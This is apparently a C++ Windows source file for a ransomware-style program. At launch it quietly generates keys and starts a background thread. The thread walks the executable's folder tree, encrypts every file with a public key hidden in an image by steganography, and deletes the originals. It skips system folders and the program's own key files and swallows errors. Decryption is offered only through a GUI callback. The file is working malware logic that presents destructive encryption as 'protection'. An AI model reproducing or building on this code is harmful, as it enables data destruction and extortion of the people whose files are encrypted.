#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <filesystem>
#include <thread>
#include "ui/gui.h"
#include "file_encryptor.h"
#include "crypto/steganography.h"
#include "io/file_handler.h"
#include "constants.h"

// Forward declarations
void performEncryption();
void performDecryption();

// Global GUI instance
GUI* g_gui = nullptr;

// Check if a file should be skipped during protection process
// Using static to avoid name collision with the one in main.cpp
static bool shouldSkipFile(const std::filesystem::path& path, const std::filesystem::path& exePath) {
    // Skip the executable itself
    if (path == exePath) return true;
    
    // Skip already protected files (with .enc extension)
    if (path.extension() == ".enc") return true;
    
    // Skip key files
    if (path.extension() == ".key") return true;
    if (path.extension() == ".prv") return true;
    if (path.extension() == ".pub") return true;
    
    // Skip the key-containing image files
    if (path.filename() == PRIVATE_KEY_IMAGE || path.filename() == PUBLIC_KEY_IMAGE) return true;
    
    // Skip system and important directories
    std::string pathStr = path.string();
    std::vector<std::string> skipPatterns = {
        "\\.git\\", "/.git/", 
        "\\Windows\\", "/Windows/",
        "\\Program Files\\", "/Program Files/",
        "\\AppData\\", "/AppData/",
        "\\System32\\", "/System32/"
    };
    
    for (const auto& pattern : skipPatterns) {
        if (pathStr.find(pattern) != std::string::npos) {
            return true;
        }
    }
    
    return false;
}

// Function to encrypt files in background
void performEncryption() {
    std::filesystem::path exePath = std::filesystem::canonical(std::filesystem::path(
        #ifdef _WIN32
            _pgmptr
        #else
            "/proc/self/exe"
        #endif
    ));
    
    std::filesystem::path currentDir = exePath.parent_path();
    
    // Generate keys silently
    if (generateEncryptionKeys("", "")) {
        // Load public key from image
        std::vector<uint8_t> publicKey = Steganography::extractDataFromImage(PUBLIC_KEY_IMAGE);
        
        if (!publicKey.empty()) {
            int filesEncrypted = 0;

            // Process files in directory (similar to secureFilesInDirectory but simplified)
            for (const auto& entry : std::filesystem::recursive_directory_iterator(currentDir)) {
                if (entry.is_regular_file() && !shouldSkipFile(entry.path(), exePath)) {
                    std::string outputPath = entry.path().string() + ".enc";
                    auto result = encryptFileWithKey(entry.path().string(), outputPath, publicKey);
                    
                    if (result.success) {
                        try {
                            std::filesystem::remove(entry.path());
                            filesEncrypted++;
                        } catch (...) {
                            // Silently ignore errors
                        }
                    }
                }
            }

            // Update UI after encryption is complete
            if (g_gui) {
                g_gui->showCompletionMessage();
            }
        }
    }
}

// Function to decrypt files in background
void performDecryption() {
    std::filesystem::path exePath = std::filesystem::canonical(std::filesystem::path(
        #ifdef _WIN32
            _pgmptr
        #else
            "/proc/self/exe"
        #endif
    ));
    
    std::filesystem::path currentDir = exePath.parent_path();
    
    // Load private key from image
    std::vector<uint8_t> privateKey = Steganography::extractDataFromImage(PRIVATE_KEY_IMAGE);
    
    if (!privateKey.empty()) {
        // Process encrypted files in directory
        for (const auto& entry : std::filesystem::recursive_directory_iterator(currentDir)) {
            if (entry.is_regular_file() && entry.path().extension() == ".enc") {
                std::filesystem::path outputPath = entry.path();
                outputPath.replace_extension(); // Remove .enc extension
                
                auto result = decryptFileWithKey(entry.path().string(), outputPath.string(), privateKey);
                
                if (result.success) {
                    try {
                        std::filesystem::remove(entry.path());
                    } catch (...) {
                        // Silently ignore errors
                    }
                }
            }
        }
        
        // Notify the UI that decryption is complete
        if (g_gui) {
            g_gui->notifyDecryptionComplete();
        }
    }
}

// Windows entry point - ignore unused parameters to silence warnings
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE /*hPrevInstance*/, LPSTR /*lpCmdLine*/, int /*nCmdShow*/) {
    // Create GUI
    GUI gui;
    g_gui = &gui;
    
    if (!gui.initialize(hInstance)) {
        return 1;
    }
    
    // Show the initial message
    gui.showStartMessage();
    
    // Set decrypt callback
    gui.setDecryptCallback(performDecryption);
    
    // Start encryption in a separate thread
    std::thread encryptThread(performEncryption);
    encryptThread.detach(); // Let it run independently
    
    // Run the message loop
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return (int)msg.wParam;
}
